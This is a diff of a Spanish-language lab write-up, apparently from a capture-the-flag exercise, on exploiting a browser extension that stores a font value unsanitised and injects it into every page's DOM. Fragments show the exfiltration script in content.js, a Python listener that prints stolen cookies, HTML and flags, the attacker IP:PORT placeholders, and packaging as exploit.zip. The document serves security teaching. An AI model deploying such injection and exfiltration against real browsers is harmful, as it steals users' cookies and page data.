@@ -24,7 +24,7 @@ La extensión permite al usuario cambiar la fuente tipográfica de las páginas 
 
 # 📂 Componentes Afectados
 
-popup.js
+### popup.js
 
 -El valor seleccionado por el usuario se guarda sin validación ni sanitización.
 
@@ -51,13 +51,14 @@ sel.addEventListener("change", () => {
 
 ```
 ⚠️ Nota
-`IP:PORT` debe modificarse por la IP y el puerto del servidor de escucha
-del atacante para reproducir el ataque.
 
+`IP:PORT` debe modificarse por la IP y el puerto de escucha
+del atacante.
 
-content.js
+### content.js
 
 -El valor almacenado se inserta directamente en el DOM en cada carga de página.
+
 
 ```js
 // Exfiltrar datos cuando la página carga
@@ -80,9 +81,12 @@ setTimeout(() => {
 }, 500);
 
 ```
+
 ⚠️ Nota
-`IP:PORT` debe modificarse por la IP y el puerto del servidor de escucha
-del atacante para reproducir el ataque.
+
+`IP:PORT` debe modificarse por la IP y el puerto de escucha
+del atacante.
+
 
 
 # 📡 Servidor de Recepción de Datos (server.py)
@@ -94,7 +98,9 @@ extensión vulnerable.
 El servidor maneja peticiones POST y GET, habilita CORS y muestra por
 consola la información capturada (cookies, contenido HTML y posibles flags).
 
+
 ##📄 Bloque de código
+
 
 ```python
                 data = json.loads(post_data.decode('utf-8'))
@@ -139,9 +145,39 @@ HTTPServer(('0.0.0.0', PORT), Handler).serve_forever()
 `PORT` debe modificarse el puerto del servidor de escucha
 del atacante para reproducir el ataque.
 
+# 📦 Empaquetado de la Extensión
+Una vez realizadas las configuraciones y modificaciones necesarias en
+los archivos de la extensión, el proyecto se comprime en un archivo ZIP
+para su posterior carga en el navegador o distribución dentro del
+laboratorio.
+
+### 🗜️ Creación del archivo comprimido
+
+El empaquetado se realiza comprimiendo los archivos principales de la
+extensión en un único archivo exploit.zip:
+
+```bash
+zip -r exploit.zip manifest.json popup.html popup.js content.js
+```
+
+<img width="1185" height="524" alt="image" src="https://github.com/user-attachments/assets/49194034-3416-4e9a-8013-062b606e7c54" />
 
 
+###▶️ Puesta en Marcha del Servidor de Escucha
 
+Antes de cargar comprimida (exploit.zip), es necesario
+iniciar el servidor de escucha que recibirá los datos enviados por la
+extensión durante el laboratorio.
 
+<img width="1504" height="231" alt="image" src="https://github.com/user-attachments/assets/4b679e65-84ff-4fbe-9845-8225629b78a5" />
 
+###🧩 Carga de la Extensión en el Navegador
+
+Con el servidor de escucha en ejecución y el archivo exploit.zip
+correctamente generado, se procede a cargar la extensión en el navegador
+para iniciar el escenario de explotación.
+
+<img width="1897" height="807" alt="image" src="https://github.com/user-attachments/assets/5ef80c14-8baf-4106-8a12-c92a42410946" />
+
+<img width="1862" height="795" alt="image" src="https://github.com/user-attachments/assets/1a5e63e7-73b6-47f7-b5ea-16a132206650" />
 
